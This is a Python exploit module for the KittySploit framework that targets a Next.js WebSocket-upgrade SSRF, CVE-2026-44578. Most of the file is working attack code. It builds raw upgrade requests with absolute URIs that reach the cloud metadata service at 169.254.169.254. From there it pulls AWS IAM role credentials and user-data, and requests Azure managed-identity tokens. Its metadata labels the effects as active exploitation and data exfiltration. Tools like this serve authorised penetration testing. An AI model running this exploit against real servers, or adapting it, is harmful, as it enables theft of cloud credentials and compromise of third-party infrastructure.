#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""CVE-2026-44578 — Next.js WebSocket upgrade SSRF (absolute-URI proxy)."""

import json
import re
import socket
import ssl
import time
from contextlib import closing
from typing import Optional, Tuple
from urllib.parse import urlparse

from kittysploit import *
from lib.protocols.http.http_client import Http_client

_WS_KEY = "dGhlIHNhbXBsZSBub25jZQ=="
_NEXT_MARKERS = ("/_next/static", "/_next/chunks", 'charset="utf-8"')

_IMDS_PATTERNS = (
    r"ami-[a-f0-9]{8}",
    r"AccessKeyId",
    r"SecretAccessKey",
    r"AKIA[0-9A-Z]{16}",
    r"ip-\d+-\d+-\d+-\d+\.ec2\.internal",
    r'"accountId"',
    r'"subscriptionId"',
    r"droplet_id",
    r"compartmentId",
    r"ami-id",
    r"instance-id",
)


class Module(Auxiliary, Http_client):
    __info__ = {
        "name": "Next.js router-server WebSocket upgrade SSRF (CVE-2026-44578)",
        "description": (
            "Exploits CVE-2026-44578: WebSocket upgrade handler proxies absolute "
            "http:// request-line URIs (GET, port 80) without honouring finished/"
            "308 from normalizeRepeatedSlashes. Actions: test (confirm), aws / azure "
            "(IMDS harvest), custom (ssrf_url). Self-hosted only; Vercel/nginx often "
            "block. Fixed in 15.5.16 / 16.2.5."
        ),
        "author": ["Hadrian Security", "mitsec", "ynsmroztas", "KittySploit Team"],
        "cve": ["CVE-2026-44578"],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-44578",
            "https://github.com/advisories/GHSA-c4j6-fc7j-m34r",
            "https://bastion.tech/blog/nextjs-cve-2026-44578-websocket-ssrf-self-hosted/",
        ],
        "tags": [
            "http",
            "nextjs",
            "ssrf",
            "websocket",
            "imds",
            "cloud",
            "cve-2026-44578",
        ],
        "agent": {
            "risk": "intrusive",
            "effects": ["active_exploitation", "data_exfiltration"],
            "expected_requests": 8,
            "reversible": True,
            "approval_required": True,
            "produces": ["credentials", "risk_signals", "exploit_paths"],
            "cost": 1.2,
            "noise": 0.45,
            "value": 1.0,
            "requires": {
                "min_endpoints": 0,
                "min_params": 0,
                "tech_hints_any": ["nextjs", "next.js"],
                "tech_hints_all": [],
                "specializations_any": [],
                "risk_signals_any": [],
                "auth_session": False,
                "capabilities_any": [],
                "capabilities_all": [],
                "confidence_min": {},
                "confidence_min_any": {},
                "endpoint_pattern_any": ["/_next/"],
                "param_any": [],
                "api_surface_ready": False,
            },
            "chain": {
                "produces_capabilities": [
                    {"capability": "ssrf_primitive", "from_detail": "websocket_upgrade"},
                    {"capability": "cloud_creds", "from_detail": "imds"},
                ],
                "consumes_capabilities": [],
                "option_bindings": {},
                "suggested_followups": [],
            },
        },
    }

    port = OptPort(443, "Next.js HTTP(S) port", True)
    ssl = OptBool(True, "Use HTTPS to Next.js front", True, advanced=True)
    action = OptString(
        "test",
        "Action: test | aws | azure | custom",
        required=False,
    )
    ssrf_url = OptString(
        "http://169.254.169.254/latest/meta-data/",
        "Absolute http:// URL for test/custom (port 80 only)",
        required=False,
    )
    socket_timeout = OptFloat(10.0, "Connect/read timeout", required=False, advanced=True)

    def _o(self, opt):
        if hasattr(opt, "value"):
            return opt.value
        return opt

    def _host(self) -> str:
        target = str(self._o(self.target) or "").strip()
        if "://" in target:
            return urlparse(target).hostname or target
        return target.split("/")[0].split(":")[0]

    @staticmethod
    def _is_next_body(body: str) -> bool:
        lower = (body or "").lower()
        return any(m.lower() in lower for m in _NEXT_MARKERS)

    def _ssrf(self, ssrf_url: str) -> Tuple[int, str]:
        if not str(ssrf_url).startswith("http://"):
            return 0, "ssrf_url must start with http:// (port 80 only)"
        host = self._host()
        port = int(self._o(self.port))
        use_ssl = self._to_bool(self._o(self.ssl))
        timeout = float(self._o(self.socket_timeout) or 10.0)
        raw = (
            f"GET {ssrf_url} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Connection: Upgrade\r\n"
            f"Upgrade: websocket\r\n"
            f"Sec-WebSocket-Version: 13\r\n"
            f"Sec-WebSocket-Key: {_WS_KEY}\r\n"
            f"User-Agent: Mozilla/5.0\r\n"
            f"\r\n"
        ).encode()
        try:
            sock = socket.create_connection((host, port), timeout=timeout)
            if use_ssl:
                ctx = ssl.create_default_context()
                if not self._to_bool(self._o(self.verify_ssl)):
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                sock = ctx.wrap_socket(sock, server_hostname=host)
            with closing(sock):
                sock.sendall(raw)
                sock.settimeout(timeout)
                buf = b""
                try:
                    while len(buf) < 131072:
                        chunk = sock.recv(8192)
                        if not chunk:
                            break
                        buf += chunk
                except socket.timeout:
                    pass
            resp = buf.decode(errors="replace")
            match = re.match(r"HTTP/[\d.]+ (\d+)", resp)
            code = int(match.group(1)) if match else 0
            parts = resp.split("\r\n\r\n", 1)
            body = parts[1] if len(parts) > 1 else resp
            return code, body
        except Exception as exc:
            return 0, str(exc)

    def _hit(self, code: int, body: str, url: str = "") -> Tuple[bool, str]:
        if "Failed to proxy http:/" in body:
            return True, "vulnerable path (proxy error fingerprint)"
        if self._is_next_body(body):
            return False, "Next.js HTML (not SSRF)"
        if code == 200 and body.strip():
            for pattern in _IMDS_PATTERNS:
                if re.search(pattern, body):
                    return True, f"matched {pattern}"
            if "169.254.169.254" in url and len(body) < 4000:
                return True, f"non-Next HTTP 200 ({len(body)}b)"
        return False, ""

    def _print_body(self, body: str, limit: int = 40) -> None:
        text = (body or "").strip()
        try:
            obj = json.loads(text)
            text = json.dumps(obj, indent=2)
        except Exception:
            pass
        for line in text.splitlines()[:limit]:
            print_info(f"  {line[:120]}")

    def _action_test(self) -> bool:
        url = str(self._o(self.ssrf_url) or "").strip()
        print_status(f"SSRF probe → {url}")
        code, body = self._ssrf(url)
        ok, reason = self._hit(code, body, url)
        print_info(f"HTTP {code} ({len(body)}b) — {reason or 'no hit'}")
        if ok:
            print_warning(f"SSRF confirmed: {reason}")
            self._print_body(body, 20)
            return True
        print_error("No SSRF confirmation")
        return False

    def _action_aws(self) -> bool:
        print_status("AWS IMDSv1 chain via WebSocket SSRF")
        hits = 0
        meta = {}

        probes = [
            ("instance-id", "http://169.254.169.254/latest/meta-data/instance-id"),
            ("instance-type", "http://169.254.169.254/latest/meta-data/instance-type"),
            ("hostname", "http://169.254.169.254/latest/meta-data/hostname"),
            ("local-ipv4", "http://169.254.169.254/latest/meta-data/local-ipv4"),
            ("ami-id", "http://169.254.169.254/latest/meta-data/ami-id"),
            ("region", "http://169.254.169.254/latest/meta-data/placement/region"),
            ("iam-roles", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
            ("user-data", "http://169.254.169.254/latest/user-data"),
        ]
        for name, url in probes:
            code, body = self._ssrf(url)
            ok, reason = self._hit(code, body, url)
            val = body.strip()[:120] if ok and code == 200 else ""
            print_info(f"[{code}] {name}: {val or reason or '-'}")
            if val:
                meta[name] = val
                hits += 1
            time.sleep(0.05)

        role = (meta.get("iam-roles") or "").splitlines()[0].strip() if meta.get("iam-roles") else ""
        if role:
            code, body = self._ssrf(
                f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role}"
            )
            ok, _ = self._hit(code, body, "iam-creds")
            if ok and code == 200:
                print_warning(f"IAM credentials for role {role}:")
                self._print_body(body, 25)
                hits += 1
                try:
                    creds = json.loads(body)
                    ak = creds.get("AccessKeyId", "")
                    if ak:
                        print_success(f"AccessKeyId: {ak}")
                except Exception:
                    pass

        if hits:
            print_warning(f"AWS IMDS reachable ({hits} hit(s))")
            return True
        print_error("No AWS IMDS data (IMDSv2-only, no role, or SSRF blocked)")
        return False

    def _action_azure(self) -> bool:
        print_status("Azure IMDS via WebSocket SSRF")
        url = "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
        # Azure IMDS requires Metadata: true — absolute proxy may strip custom
        # headers; still try instance JSON then identity token.
        code, body = self._ssrf(url)
        ok, reason = self._hit(code, body, url)
        print_info(f"instance [{code}]: {reason or '-'}")
        if ok and code == 200:
            self._print_body(body, 30)
            return True

        tok_url = (
            "http://169.254.169.254/metadata/identity/oauth2/token"
            "?api-version=2018-02-01&resource=https://management.azure.com/"
        )
        code, body = self._ssrf(tok_url)
        ok, reason = self._hit(code, body, tok_url)
        if ok and "access_token" in body:
            print_warning("Azure managed-identity token response:")
            self._print_body(body, 15)
            return True
        print_error("Azure IMDS not reachable (often needs Metadata: true header)")
        return False

    def run(self) -> bool:
        action = str(self._o(self.action) or "test").strip().lower()
        print_status(
            f"CVE-2026-44578 Next.js WebSocket SSRF — action={action} "
            f"target={self._host()}:{self._o(self.port)}"
        )
        print_info("Limits: GET + http:// port 80 | Vercel/nginx may block | IMDSv2 N/A")

        if action == "test":
            return self._action_test()
        if action == "custom":
            return self._action_test()
        if action == "aws":
            return self._action_aws()
        if action == "azure":
            return self._action_azure()

        print_error(f"Unknown action: {action}")
        print_info("Valid: test | aws | azure | custom")
        return False

    def check(self):
        url = str(self._o(self.ssrf_url) or "").strip()
        code, body = self._ssrf(url)
        ok, reason = self._hit(code, body, url)
        if ok:
            return {
                "vulnerable": True,
                "reason": reason,
                "confidence": "high",
                "http": code,
            }
        return {
            "vulnerable": False,
            "reason": reason or f"HTTP {code}, no SSRF markers",
            "confidence": "low",
            "http": code,
        }
